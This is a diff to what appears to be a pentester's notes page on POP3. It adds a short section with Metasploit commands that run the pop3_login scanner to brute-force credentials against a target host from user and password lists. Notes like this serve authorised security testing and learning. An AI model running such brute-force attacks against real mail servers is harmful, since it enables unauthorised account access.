@@ -31,6 +31,25 @@ $ openssl s_client -connect IP:pop3s
 
 <hr class="sep-both">
 
+## Pentester Notes ☠️
+
+<div class="row row-cols-lg-2"><div>
+
+You may try to use [brute force](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md):
+
+```shell!
+$ msfconsole -q
+msf6> auxiliary/scanner/pop3/pop3_login
+msf6> set USER_FILE /path/to/users.lst
+msf6> set PASS_FILE /path/to/pass.lst
+msf6> setg RHOST IP
+msf6> run
+```
+</div><div>
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
